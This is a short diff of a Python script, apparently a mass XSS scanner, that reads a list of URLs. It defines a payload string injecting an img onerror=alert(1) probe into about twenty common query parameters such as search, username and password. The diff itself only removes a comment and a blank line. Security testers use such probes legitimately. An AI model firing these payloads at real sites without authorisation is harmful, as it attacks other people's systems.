@@ -6,9 +6,7 @@ import argparse
 parser = argparse.ArgumentParser(description='Exibe uma lista de URLs.')
 parser.add_argument('-l', '--lista', type=str, help='Arquivo contendo a lista de URLs.')
 
-# Parse dos argumentos
 args = parser.parse_args()
-
 urls = args.lista
 
 payload_xss_1 = "?q=%27%22><img src=x onerror=alert(1)>&search=%27%22><img src=x onerror=alert(1)>&query=%27%22><img src=x onerror=alert(1)>&keywords=%27%22><img src=x onerror=alert(1)>&term=%27%22><img src=x onerror=alert(1)>&text=%27%22><img src=x onerror=alert(1)>&input=%27%22><img src=x onerror=alert(1)>&value=%27%22><img src=x onerror=alert(1)>&username=%27%22><img src=x onerror=alert(1)>&password=%27%22><img src=x onerror=alert(1)>&name=%27%22><img src=x onerror=alert(1)>&email=%27%22><img src=x onerror=alert(1)>&comment=%27%22><img src=x onerror=alert(1)>&message=%27%22><img src=x onerror=alert(1)>&body=%27%22><img src=x onerror=alert(1)>&title=%27%22><img src=x onerror=alert(1)>&subject=%27%22><img src=x onerror=alert(1)>&description=%27%22><img src=x onerror=alert(1)>&content=%27%22><img src=x onerror=alert(1)>"
